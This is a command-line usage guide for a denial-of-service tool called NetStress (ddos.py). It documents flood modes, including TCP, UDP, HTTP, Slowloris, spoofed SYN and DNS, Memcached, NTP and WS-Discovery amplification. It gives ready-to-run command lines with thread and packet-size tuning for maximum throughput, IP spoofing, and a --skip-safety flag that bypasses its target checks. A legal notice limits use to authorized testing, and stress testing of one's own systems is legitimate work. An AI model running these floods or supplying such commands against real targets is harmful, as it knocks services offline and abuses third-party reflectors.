# CLI Usage Guide

Command-line interface reference for NetStress.

---

## Basic Usage

```bash
# Show help
python ddos.py --help

# Basic attack
python ddos.py -i TARGET -p PORT -t PROTOCOL

# Example: UDP flood
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 60

# Example: HTTP flood
python ddos.py -i 192.168.1.100 -p 80 -t HTTP -x 8
```

---

## Command Options

### Required Parameters

```
-i, --target TARGET     Target IP address or hostname
-p, --port PORT         Target port number
-t, --protocol PROTO    Attack protocol (see list below)
```

### Optional Parameters

```
-d, --duration SEC      Attack duration in seconds (default: 60)
-x, --threads NUM       Number of threads (default: 4)
-s, --size BYTES        Packet size in bytes (default: 1024)
--rate-limit PPS        Max packets per second
```

### Advanced Options

```
--ai-optimize           Enable AI parameter optimization
--spoof-ip              Enable IP spoofing (requires root)
--custom-payload DATA   Custom payload string
```

### Output Options

```
-v, --verbose           Verbose output
--log-file FILE         Log to file
--no-banner             Hide startup banner
```

---

## Supported Protocols

| Protocol     | Description             | Best For                  |
| ------------ | ----------------------- | ------------------------- |
| TCP          | TCP connection flood    | General testing           |
| UDP          | UDP packet flood        | Bandwidth testing         |
| HTTP         | HTTP request flood      | Web server testing        |
| HTTPS        | HTTPS request flood     | Secure web testing        |
| DNS          | DNS query flood         | DNS server testing        |
| ICMP         | ICMP echo flood         | Network testing           |
| SLOW         | Slowloris attack        | Connection exhaustion     |
| QUANTUM      | Multi-vector attack     | Advanced testing          |
| TCP-SYN      | SYN flag flood          | Firewall testing          |
| TCP-ACK      | ACK flag flood          | Stateful firewall testing |
| PUSH-ACK     | PUSH-ACK flood          | Application testing       |
| WS-DISCOVERY | WS-Discovery reflection | Amplification testing     |
| MEMCACHED    | Memcached reflection    | Amplification testing     |
| SYN-SPOOF    | Spoofed SYN flood       | Advanced testing          |
| NTP          | NTP reflection          | Amplification testing     |

---

## Examples

### Basic Tests

```bash
# TCP flood for 60 seconds
python ddos.py -i 192.168.1.100 -p 80 -t TCP -d 60

# UDP flood with 8 threads
python ddos.py -i 192.168.1.100 -p 53 -t UDP -x 8

# HTTP flood with verbose output
python ddos.py -i 192.168.1.100 -p 80 -t HTTP -v
```

### High Performance

```bash
# UDP with large packets and many threads
python ddos.py -i 192.168.1.100 -p 80 -t UDP -s 8192 -x 32

# Maximum throughput test
python ddos.py -i 192.168.1.100 -p 80 -t UDP -s 4096 -x 64
```

### Protocol-Specific

```bash
# DNS amplification
python ddos.py -i 192.168.1.100 -p 53 -t DNS -x 16

# Slowloris (connection exhaustion)
python ddos.py -i 192.168.1.100 -p 80 -t SLOW -x 100

# SYN flood with spoofing
python ddos.py -i 192.168.1.100 -p 80 -t SYN-SPOOF --spoof-ip
```

---

## Output Format

During execution, you'll see real-time statistics:

```
Attack Stats: 244630 pps | 16.03 Gbps | Connections: 1200/s | Errors: 5
Protocol breakdown: UDP: 244630 pps
Volume: 1.2 GB sent
```

### Metrics Explained

- **pps**: Packets per second
- **Gbps/Mbps**: Throughput in bits per second
- **Connections/s**: New connections per second
- **Errors**: Failed operations count

---

## Safety Features

The CLI includes built-in safety checks:

1. **Target validation** - Blocks attacks on production systems
2. **Resource monitoring** - Prevents system overload
3. **Duration limits** - Configurable maximum duration
4. **Emergency stop** - Press Ctrl+C to stop immediately

### Bypass Safety (Use with Caution)

```bash
# Skip safety checks (authorized testing only)
python ddos.py -i TARGET -p PORT -t PROTO --skip-safety
```

---

## Logging

### Enable Logging

```bash
# Log to file
python ddos.py -i TARGET -p PORT -t PROTO --log-file attack.log

# Verbose console output
python ddos.py -i TARGET -p PORT -t PROTO -v
```

### Log Locations

- `attack.log` - Main activity log
- `audit_logs/` - Audit database and logs

---

## Troubleshooting

### "Permission denied"

Some protocols require elevated privileges:

```bash
# Linux/macOS
sudo python ddos.py -i TARGET -p PORT -t ICMP

# Windows (run as Administrator)
python ddos.py -i TARGET -p PORT -t ICMP
```

### "Target validation failed"

The target is blocked by safety systems. Options:

1. Use an authorized test target
2. Add target to allowed list
3. Use `--skip-safety` (authorized testing only)

### Low Performance

Try these optimizations:

```bash
# Increase threads
python ddos.py -i TARGET -p PORT -t UDP -x 32

# Increase packet size
python ddos.py -i TARGET -p PORT -t UDP -s 8192

# Use UDP for maximum throughput
python ddos.py -i TARGET -p PORT -t UDP
```

---

## Legal Notice

This tool is for authorized security testing only:

- Your own systems
- Systems you have written permission to test
- Isolated test environments

Unauthorized use is illegal and unethical.

---

**Version**: 1.0.0
